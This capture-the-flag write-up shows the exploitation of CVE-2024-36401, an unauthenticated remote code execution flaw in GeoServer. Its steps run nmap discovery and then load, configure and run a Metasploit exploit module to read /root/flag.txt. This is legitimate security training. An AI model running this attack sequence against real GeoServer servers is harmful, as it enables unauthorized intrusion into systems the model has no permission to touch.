# Vulnerability Exploitation Report: CVE-2024-36401

## Vulnerability Overview
**CVE ID**: CVE-2024-36401  
**CVSS Score**: 9.8 (Critical)  
**Description**: GeoServer, an open-source server for sharing geospatial data, contains a vulnerability in its OGC (Open Geospatial Consortium) request parameters that allows unauthenticated users to execute remote code execution (RCE). This critical flaw enables attackers to run arbitrary commands on the target system without authentication, posing a severe security risk.

## Objective
The goal is to exploit the CVE-2024-36401 vulnerability on a target GeoServer instance to gain unauthorized access and retrieve a flag file (`/root/flag.txt`) as part of a capture-the-flag (CTF) challenge.

## Target Information
- **Target IP**: 192.168.5.0
- **Target Port**: 8080 (assumed to be the GeoServer service port)
- **Attack Machine IP**: 192.168.0.5
- **Objective**: Retrieve the contents of `/root/flag.txt`

## Exploitation Steps

### Step 1: Network Discovery
To identify active hosts in the target network, perform a ping scan using `nmap` to discover devices on the 192.168.5.0/24 subnet.

```
nmap -sn 192.168.5.0/24
```

### Step 2: Service Enumeration
Once the target host (192.168.5.0) is identified, enumerate the services running on it to confirm the presence of GeoServer or other vulnerable services.

```
nmap -sV 192.168.5.0
```

### Step 3: Verify GeoServer Accessibility
Confirm that the GeoServer instance is accessible by sending an HTTP request to the target IP on port 8080, where GeoServer is typically hosted.

```
curl 192.168.5.0:8080
```

### Step 4: Launch Metasploit
Start the Metasploit Framework to access its exploit modules and tools for exploiting the GeoServer vulnerability.

```
msfconsole
```

### Step 5: Search for GeoServer Exploit
Search Metasploit’s database for an exploit module specific to GeoServer, particularly one addressing the CVE-2024-36401 vulnerability.

```
search geoserver
```

### Step 6: Select the Exploit Module
Choose the Metasploit exploit module designed for the GeoServer unauthenticated RCE vulnerability (CVE-2024-36401).

```
use exploit/multi/http/geoserver_unauth_rce_cve_2024_36401
```

### Step 7: Review Exploit Details
Display detailed information about the selected exploit module to understand its requirements, options, and payload capabilities.

```
info
```

### Step 8: Configure the Exploit
Set the target host for the exploit to the GeoServer instance’s IP address.

```
set RHOSTS 192.168.5.0
```

### Step 9: Execute the Exploit
Run the exploit to attempt remote code execution on the target GeoServer instance.

```
exploit
```

### Step 10: Retrieve the Flag
Once a shell or command execution is achieved, retrieve the contents of the flag file located at `/root/flag.txt`.

```
cat /root/flag.txt
```

## Final Result
The exploitation was successful, and the flag was retrieved from the target system.
